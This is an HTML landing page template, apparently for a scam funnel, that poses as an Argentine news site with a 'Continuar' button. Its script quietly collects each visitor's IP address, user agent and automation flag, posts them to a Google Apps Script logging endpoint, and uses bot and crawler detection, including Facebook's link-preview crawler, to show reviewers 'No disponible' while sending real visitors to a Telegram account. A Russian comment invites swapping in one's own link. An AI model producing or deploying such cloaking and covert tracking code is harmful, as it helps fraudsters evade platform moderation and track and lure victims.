  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #333;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    .btn {
      padding: 15px 30px;
      background: #008080;
      color: white;
      border: none;
      font-size: 1.2em;
      border-radius: 10px;
      cursor: pointer;
    }
    .btn:hover {
      background: #006666;
    }
  </style>
</head>
<body>
  <h1>Bienvenido a las noticias reales de Argentina</h1>
  <button class="btn" onclick="go()">Continuar</button>

  <script>
    async function go() {
      const ua = navigator.userAgent || '';
      const webdriver = navigator.webdriver ? '1' : '0';
      const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
      const isSuspiciousUA = suspiciousUAs.some(rx => rx.test(ua));
      let ip = '_';

      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        ip = json.ip;
      } catch (e) {}

      const isBot = webdriver === '1' || isSuspiciousUA;

      // Отправка лога в Google Sheets
      fetch('https://script.google.com/macros/s/AKfycbxTdOYf8RqR0Nn11OnsdnCpcryYBAPQiTkPnLwSjwg0QayMiVWOJiJ84OCkk2kViovhlQ/exec', {
        method: 'POST',
        body: JSON.stringify({ ip, ua, webdriver, result: isBot ? 'bot' : 'ok' })
      });

      // Редирект, если не бот
      if (!isBot) {
        window.location.href = "https://t.me/Veronica_especialista"; // ← Замени на свою ссылку
      } else {
        alert("No disponible");
      }
    }
  </script>
</body>
